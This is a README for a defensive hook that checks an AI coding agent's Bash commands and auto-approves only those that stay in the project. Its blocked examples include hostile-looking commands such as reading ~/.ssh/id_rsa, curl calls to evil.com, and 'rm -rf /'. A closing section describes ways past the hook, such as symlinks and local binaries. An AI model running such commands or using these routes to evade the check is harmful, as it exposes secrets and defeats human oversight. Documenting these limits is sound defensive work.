# Bash Command Validation Hook

## Overview

`validate-bash` is a PreToolUse hook that validates all Bash commands before execution to automatically allow those deemed safe. Conceptually, a command is safe if it only accesses and impacts files inside the project directory, does not tamper with version control information, and does not spawn processes that continue after the command completes. In practice, a command is allowed if (1) it only uses approved atomic command patterns, (2) file access is restricted to the project directory and does not include git files, (3) it does not background any processes, and (4) the analysis script can safely reason over the command's control structure.

This hook uses the python3 `bashlex` library to parse bash commands.

## What It Blocks

Commands that fail any of the four safety criteria require permission:

### 1. **Unapproved Command Patterns**

Commands not in the approved patterns list (`approved-patterns.json`).

**Examples:**
- `curl https://example.com`
- `python script.py`
- `ssh user@host`

### 2. **File Access Outside Project Directory**

#### **Absolute Paths** (starting with `/`)
Access to system directories and files outside the project.

**Examples:**
- `mkdir /tmp/test`
- `cat /etc/passwd`
- `ls > /tmp/output.txt` (redirect to absolute path)

#### **Parent Directory References** (`..`)
Escaping the project directory upward.

**Examples:**
- `cd ../../etc`
- `cat ../../../secrets.txt`
- `rm -rf ../other-project`

#### **Tilde Expansion** (`~`)
Home directory access outside project scope.

**Examples:**
- `ls ~/Documents`
- `cat ~/.ssh/id_rsa`

#### **Git Metadata Access** (`.git`, `.gitignore`)
Tampering with version control metadata and configuration.

**Examples:**
- `rm -rf .git`
- `rm .gitignore`
- `echo 'secret' >> .gitignore`
- `cat .git/config`

### 3. **Background Processes**

#### **Background Execution** (`&`)
Processes that continue after the command completes.

**Examples:**
- `long-running-process &`
- `sleep 100 &`
- `npm start &`

### 4. **Control Structures That Are Hard to Analyze**

Features that prevent safe analysis of the command's behavior:

#### **Command Substitution** (`$(cmd)`, `` `cmd` ``)
Can hide arbitrary command execution and bypass path validation.

**Examples:**
- `cd $(malicious-command)`
- `` ls `echo /etc` `` (bypasses absolute path check)
- `echo $(curl evil.com/script)`

#### **Variable Expansion** (`$VAR`, `${VAR}`)
Can inject absolute paths or reference sensitive environment variables.

**Examples:**
- `cd $HOME`
- `rm -rf $DANGEROUS_PATH`
- `cat $SECRET_FILE`

#### **Process Substitution** (`<(cmd)`, `>(cmd)`)
Can hide commands in file descriptor substitutions.

**Examples:**
- `diff <(curl evil.com/data) file.txt`

#### **Multiline Commands**
Commands containing newline characters.

**Examples:**
```bash
ls
rm -rf /
```

#### **Control Characters**
Null bytes and escape sequences that could hide malicious behavior.

## What It Allows

Commands are automatically allowed when they meet all four safety criteria. The hook uses bashlex to parse and validate compound commands.

### **Simple Commands**

Commands that:
- Use approved patterns from `approved-patterns.json`
- Only access files within the project directory (relative paths)
- Don't access git metadata
- Don't background processes

**Examples:**
- ✅ `mkdir test`
- ✅ `ls -la`
- ✅ `cd src`
- ✅ `cat file.txt`
- ✅ `npm install`
- ✅ `git status`
- ✅ `rm file.txt`
- ✅ `find . -name '*.js'`

### **Compound Commands**

The parser can safely reason over these control structures when all component commands meet the criteria:

#### **Command Chaining** (`&&`, `||`, `;`)
Sequential execution based on exit codes.

**Examples:**
- ✅ `ls dir1 && ls dir2`
- ✅ `mkdir foo || echo "failed"`
- ✅ `cat file.txt; echo "done"`

#### **Piping** (`|`)
Passing stdout between commands.

**Examples:**
- ✅ `cat file.txt | grep pattern`
- ✅ `ls -la | tail -n 20`
- ✅ `find . -name '*.js' | head -n 10`

#### **Redirects** (`>`, `>>`, `<`, `2>`, etc.)
When redirect targets meet path safety criteria (relative paths, no `..`, no `.git`).

**Examples:**
- ✅ `ls > output.txt`
- ✅ `cat < input.txt`
- ✅ `find . -name '*.log' > results.txt`
- ✅ `command 2>&1` (stderr to stdout redirect)

#### **Complex Combinations**
Multiple control structures can be combined.

**Examples:**
- ✅ `cat input.txt | grep error | tail -n 20 > errors.txt`
- ✅ `ls dir1 && cat file.txt | grep pattern`
- ✅ `mkdir -p build && npm run build > build/output.log`

## Remaining Attack Vectors

Despite this comprehensive validation, some escape vectors remain:

### 1. **Symlinks**
A symlink within the project could point outside:
```bash
ln -s /etc/passwd local-link  # Creates symlink (only allowed if `ln` is an allowed command)
cat local-link                # Reads /etc/passwd (allowed)
```

**Mitigation:** Users should be aware of what's in their project and consider not using this hook if the risk is high. The hook does not detect symlink targets at validation time. Would require filesystem inspection or additional tools.

### 2. **Dangerous Binaries in the Project Directory**
If dangerous binaries exist in the project directory:
```bash
./malicious-script  # Runs local executable
```

**Mitigation:** Users should be aware of what's in their project and consider not using this hook if the risk is high.

### 3. **Vulnerabilities in Approved Command Patterns**
Some shell built-ins don't require external paths:
```bash
cd somewhere   # Changes directory (only allowed if `cd` is an allowed command)
exec something # Replaces shell (only allowed if `exec` is an allowed command)
```

**Mitigation:** Users should be careful about what shell commands they add to their approved command patterns.

### 4. **Vulnerabilities in the Bashlex Bash Parser**

This hook uses the python3 `bashlex` library to parse bash commands. Vulnerabilities in the parser could cause vulnerabilities in the hook.

**Mitigation:** Ensure your `bashlex` installation is up-to-date.

## Installation

### Requirements

- Python 3.6 or higher

### Install bashlex

Using pip:
```bash
pip3 install bashlex
```

Using pip with user installation (if you don't have system-wide permissions):
```bash
pip3 install --user bashlex
```

Using conda:
```bash
conda install -c conda-forge bashlex
```

Check that bashlex is installed correctly:
```bash
python3 -c "import bashlex; print('bashlex version:', bashlex.__version__)"
```

### Hook Configuration

Add to `.claude/settings.local.json`:

```json
{
  "permissions": {},
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "$CLAUDE_PROJECT_DIR/.claude/hooks/validate-bash.sh"
          }
        ]
      }
    ]
  }
}
```

This configuration runs the validation hook before every Bash command. Adding permissions about Bash commands is discouraged, but permissions for non-Bash commands are appropriate.

### Testing

Run the test suite:
```bash
python3 test.py
```

### Manual Testing

Test a command:
```bash
echo '{"tool_name": "Bash", "tool_input": {"command": "YOUR_COMMAND_HERE"}}' | ./run.sh
```

If blocked, you'll see JSON with `permissionDecision: ask` and a reason.
If allowed, you'll see no output (exit code 0).

### Testing in Claude Code

Start a Claude Code instance and ask it to run a specific bash command. If the command was automatically allowed, you will not be asked to approve it.
